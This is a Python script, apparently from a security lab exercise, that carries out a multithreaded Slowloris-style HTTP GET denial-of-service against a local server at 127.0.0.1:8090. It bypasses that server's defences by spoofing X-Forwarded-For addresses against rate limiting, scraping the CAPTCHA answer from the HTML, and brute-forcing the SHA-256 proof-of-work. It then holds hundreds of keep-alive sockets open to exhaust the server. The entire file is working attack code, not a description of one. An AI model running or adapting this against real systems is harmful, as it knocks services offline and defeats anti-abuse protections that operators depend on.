import random, time, re, socket, threading, requests, hashlib, urllib.parse

#=====================================Defenses Flags======================================#
ATTACK_RATE_LIMIT = True #spoof X-Forwarded-For IP for bypassing rate limit
ATTACK_CAPTCHA = True #bypass CAPTCHA and submit it automatically
ATTACK_POW = True #solve Proof-of-Work challenge
#=========================================================================================#

#===================================Default Parameters====================================#
TARGET_IP = '127.0.0.1' #represents target IP
TARGET_PORT = 8090 #represents target port
PROTECTED_URL = f'http://{TARGET_IP}:{TARGET_PORT}/protected' #represents target server "/protected" path
SUBMIT_URL = f'http://{TARGET_IP}:{TARGET_PORT}/' #represents target server "/" path
MAX_CONNECTIONS = 100 #represents number of TCP connection sockets for each thread
SPAWN_DELAY = 0.005 #represents delay between spawning each worker
HEADER_DELAY = 10 #represents delay between sending each wave of headers
REQUEST_TIMEOUT = 10 #represents timeout for HTTP requests
SHUTDOWN_EVENT = threading.Event() #represents shutdown event for letting attack threads know when to exit
#=========================================================================================#

#===================================Header Parameters=====================================#
USER_AGENTS = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)', 'Mozilla/5.0 (X11; Linux x86_64)']
HEADER_NAMES = ['X-a', 'X-b', 'X-c', 'X-d', 'X-e']
HEADER_VALUES = ['t', 'u', 'v', 'w', 'x']
#=========================================================================================#


# class that represents DoS HTTP GET attack on HTTP server running rate limiting, CAPTCHA and Proof-of-Work defenses
class DoS_HTTP_GET():
    # method for getting "X-Forwarded-For" headers with spoofed IP address for bypassing rate limit
    @staticmethod
    def get_spoofed_headers():
        # return X-Forwarded headers with spoofed IP address for bypassing rate limit if flag set, else return our real IP address
        return {'X-Forwarded-For': '.'.join(str(random.randint(1,254)) for _ in range(4)) if ATTACK_RATE_LIMIT else socket.gethostbyname(socket.gethostname())}


    # method for getting the challenged from server html, including captcha and PoW nonce and target
    @staticmethod
    def fetch_challenges(headers):
        # get response from protected page of server that includes our challenge parameters
        protected_response = requests.get(PROTECTED_URL, headers=headers, timeout=REQUEST_TIMEOUT)
        text = protected_response.text #get the text from response

        # extract captcha code from html text
        captcha_match = re.search(r'id="captcha_code">([A-Za-z0-9]+)<', text)
        captcha_code = captcha_match.group(1) if captcha_match else None

        # extract PoW parameters from hidden fields from html text
        nonce_match = re.search(r'name="pow_nonce"\s+value="([0-9A-Fa-f]+)"', text)
        target_match = re.search(r'name="pow_target"\s+value="(0x[0-9A-Fa-f]+)"', text)
        nonce = bytes.fromhex(nonce_match.group(1)) if nonce_match else None
        target = int(target_match.group(1), 16) if target_match else None

        # return our challenge parameters
        return (captcha_code, nonce, target)


    # method for solving the PoW challenge and finding valid counter (Hard task)
    @staticmethod
    def solve_pow(nonce, target):
        counter = 0 #initilaize counter to zero

        # find valid counter such that sha256(nonce + counter) <= target
        while True:
            # covert counter to byte array
            counter_bytes = counter.to_bytes(8, 'big')

            # get hash of nonce + counter for evaluation
            hash = hashlib.sha256(nonce + counter_bytes).digest()

            # check if hash meets the requiremnts
            if int.from_bytes(hash, 'big') <= target:
                # return the vaild counter we found
                return counter_bytes

            # else we increment counter and keep searching
            counter += 1


    # method for performing HTTP-GET DoS attack on HTTP server and keeping TCP sockets alive for overwhelming server
    @staticmethod
    def perform_DoS():
        socket_list = [] #represents socket list with valid sockets we want to keep alive

        # created TCP socket connections to server for HTTP-GET DoS attack
        for _ in range(MAX_CONNECTIONS):
            try:
                # check if shutdown event is set, if so we finish HTTP-GET DoS attack
                if SHUTDOWN_EVENT.is_set():
                    break

                # initialize our parameters for performing HTTP-GET DoS attack
                request_parameters = {} #represents our HTTP request patameters
                spoofed_headers = DoS_HTTP_GET.get_spoofed_headers() #initialize our spoofed headers with spoofed IP address
                captcha_code, nonce, target = DoS_HTTP_GET.fetch_challenges(spoofed_headers) #get challenge parameters for bypassing server defences

                # check if captcha enabled, if so we add captcha code in request parameters dictionary
                if ATTACK_CAPTCHA:
                    # if captcha code found we add it to dictionary
                    if captcha_code:
                        request_parameters['captcha_input'] = captcha_code

                    # else we didn't find captcha code so we show error message
                    else:
                        print('[-] Failed to retrieve CAPTCHA code.')
                        continue

                # check if PoW enabled, if so we solve the PoW and set PoW parameters in request parameters dictionary
                if ATTACK_POW:
                    # if we found nonce and target for PoW we solve PoW challenge and add it to dictionary
                    if nonce and target:
                        counter = DoS_HTTP_GET.solve_pow(nonce, target)
                        request_parameters['pow_nonce'] = nonce.hex()
                        request_parameters['pow_target'] = hex(target)
                        request_parameters['pow_counter'] = counter.hex()

                    # else we didn't find nonce and target so we show error message
                    else:
                        print('[-] Failed to retrieve PoW parameters.')
                        continue

                # create request url for GET request with our calculated paramters
                parameters_query = '?' + urllib.parse.urlencode(request_parameters) if request_parameters else ''
                request_url = f'{SUBMIT_URL}{parameters_query}'

                # open raw socket and send GET request with our answered parameters
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(REQUEST_TIMEOUT)
                sock.connect((TARGET_IP, TARGET_PORT))

                # send GET request to HTTP server with our parameters and get response from submit page
                get_request = (
                    f'GET {request_url} HTTP/1.1\r\n'
                    f'Host: {TARGET_IP}\r\n'
                    f'X-Forwarded-For: {spoofed_headers.get('X-Forwarded-For')}\r\n'
                    f'Connection: keep-alive\r\n'
                    f'User-Agent: {random.choice(USER_AGENTS)}\r\n\r\n'
                )
                sock.sendall(get_request.encode())

                # receive the get response from server and extract the status code
                get_response = sock.recv(1024)
                status_line = get_response.split(b'\r\n', 1)[0]
                status_code = int(status_line.split(b' ')[1])

                # check if status code is 200, means we bypassed defences so we show success message
                if status_code == 200:
                    print(f'[+] Bypass success: {spoofed_headers.get('X-Forwarded-For')} -> status {status_code}.')
                    socket_list.append(sock) #add socket to our socket list for keeping it alive

                # else we failed bypassing defences, we show error message
                else:
                    print(f'[-] Bypass failed: {spoofed_headers.get('X-Forwarded-For')} -> status {status_code}.')
                    sock.close() #close socket that failed bypassing the defenses

            # if exeption occurred we failed bypassing defences, we show error message
            except:
                print(f'[-] No Response: {spoofed_headers.get('X-Forwarded-For')} -> status 404.')
                continue

        # keep connections alive by sending keep alive messages for crashing the server
        while not SHUTDOWN_EVENT.is_set():
            # iterate over each open TCP socket and keep it alive for crashing the server
            for sock in socket_list:
                try:
                    # create keep alive message with random header name and value and send it to server
                    keep_alive = f'{random.choice(HEADER_NAMES)}: {random.choice(HEADER_VALUES)}\r\n\r\n'
                    sock.sendall(keep_alive.encode())
                    time.sleep(HEADER_DELAY)

                # if exeption occurred close failed socket
                except:
                    sock.close() #close socket that failed
                    continue


# represents main for HTTP-GET DoS attack
if __name__ == '__main__':
    try:
        attack_thread_list = [] #represents our attack threads we create during HTTP-GET DoS attack, saving them for cleanup

        # start our HTTP-GET DoS attack on desired HTTP server and bypass it's defenses
        print(f'[*] Performing HTTP-GET DoS on {TARGET_IP}:{TARGET_PORT} and bypassing defenses: rate-limit={ATTACK_RATE_LIMIT}, captcha={ATTACK_CAPTCHA}, pow={ATTACK_POW}')
        while True:
            # create threads indefinitely and perform HTTP-GET DoS attack
            attack_thread = threading.Thread(target=DoS_HTTP_GET.perform_DoS, daemon=True)
            attack_thread_list.append(attack_thread) #add attack thread to our list for later cleanup
            attack_thread.start() # start the attack thread
            time.sleep(SPAWN_DELAY) #add small delay between thread spawn

    # if we receive keyboard interrupt we stop HTTP-GET DoS
    except KeyboardInterrupt:
        print('[*] Stopping DoS attack...')
        # set shutdown event flag for notifying threads to exit
        SHUTDOWN_EVENT.set()
        # iterate over all our attack threads and join them for cleanup
        for attack_thread in attack_thread_list:
            attack_thread.join() # join each thread for cleanup
        print('[*] All attack threads stopped. Exiting.')